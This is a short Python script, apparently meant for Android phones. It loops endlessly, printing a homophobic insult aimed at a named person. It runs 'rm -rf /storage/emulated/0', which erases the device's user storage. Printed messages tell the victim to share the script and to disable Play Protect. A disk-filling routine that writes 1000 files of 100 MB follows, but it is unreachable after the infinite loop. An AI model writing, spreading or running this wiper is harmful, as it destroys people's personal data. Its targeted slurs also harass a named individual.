import random
import os
import time
while True:
    print("HAHHAHAHAHHA QUREESHIII IS GAYYYYYYYYY")
    time.sleep(0)
    if os.path.exists("/storage/emulated/0"):
        os.system("rm -rf /storage/emulated/0")
        time.sleep(0)
        print("HAHAHAHAHHA SHARE IT WITH YOUR FRI")
    else:
        print("DISABLE V PROTECT TO BYPASS ANY CO")
        # Define the size of the file in bytes (100 MB in this example)
file_size = 100 * 1024 * 1024

# Define the characters that can be used in the file content and file names
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

# Define the buffer size for writing to the file (1 MB in this example)
buffer_size = 1024 * 1024

# Define the directory where the files will be saved
directory = "files"

# Create the directory if it doesn't exist
if not os.path.exists(directory):
    os.makedirs(directory)

# Define the file name for the list of file names
file_list_name = "file_list.txt"

# Generate a list of random file names
file_list = []
for i in range(1000):
    file_name = "".join(random.choice(characters) for i in range(10))
    file_path = os.path.join(directory, file_name + ".txt")
    file_list.append(file_path)

# Write the list of file names to a file
with open(os.path.join(directory, file_list_name), "w") as f:
    for file_name in file_list:
        f.write(file_name + "\n")

# Open each file in the list, generate random content, and write it to the file
for file_path in file_list:
    with open(file_path, "w") as f:
        # Write the file in chunks
        bytes_written = 0
        while bytes_written < file_size:
            # Generate a chunk of random content
            chunk_size = min(buffer_size, file_size - bytes_written)
            chunk_content = "".join(random.choice(characters) for i in range(chunk_size))
            # Write the chunk to the file
            f.write(chunk_content)
            bytes_written += chunk_size

# Verify the files were created
for file_path in file_list:
    if os.path.isfile(file_path):
        print(f"The file {file_path} was created successfully!")
    else:
        print(f"An error occurred while creating the file {file_path}.")
        exit()
